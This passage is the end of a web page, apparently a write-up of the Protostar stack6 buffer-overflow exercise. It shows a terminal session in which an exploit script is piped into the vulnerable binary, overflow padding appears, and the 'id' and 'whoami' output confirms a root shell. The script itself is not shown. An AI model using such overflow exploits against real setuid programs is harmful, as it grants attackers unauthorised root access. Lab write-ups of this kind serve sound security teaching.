			user@ubuntu<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>protostar64$&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>python&nbsp;stack6-v2.py<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">cat)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;bin<span style="color:#ff9d00;font-weight:700">/</span>stack6-v2<br>
			input&nbsp;path&nbsp;please<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;got&nbsp;path&nbsp;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@<br>
			<span style="color:#ff9d00;font-weight:700">id</span><br>
			<span style="color:#7f0044;font-weight:400">uid</span>=1000<span style="color:#ff9d00;font-weight:700">(</span>user<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=1000<span style="color:#ff9d00;font-weight:700">(</span>user<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;euid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;egid=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=0<span style="color:#ff9d00;font-weight:700">(</span>root<span style="color:#ff9d00;font-weight:700">)</span>,4<span style="color:#ff9d00;font-weight:700">(</span>adm<span style="color:#ff9d00;font-weight:700">)</span>,24<span style="color:#ff9d00;font-weight:700">(</span>cdrom<span style="color:#ff9d00;font-weight:700">)</span>,27<span style="color:#ff9d00;font-weight:700">(sudo)</span>,30<span style="color:#ff9d00;font-weight:700">(</span>dip<span style="color:#ff9d00;font-weight:700">)</span>,46<span style="color:#ff9d00;font-weight:700">(</span>plugdev<span style="color:#ff9d00;font-weight:700">)</span>,109<span style="color:#ff9d00;font-weight:700">(</span>lpadmin<span style="color:#ff9d00;font-weight:700">)</span>,124<span style="color:#ff9d00;font-weight:700">(</span>sambashare<span style="color:#ff9d00;font-weight:700">)</span>,1000<span style="color:#ff9d00;font-weight:700">(</span>user<span style="color:#ff9d00;font-weight:700">)</span><br>
			<span style="color:#ff9d00;font-weight:700">whoami</span><br>
			root
		</div>
	</div>
    </writeup>
</section>

</body>
</html>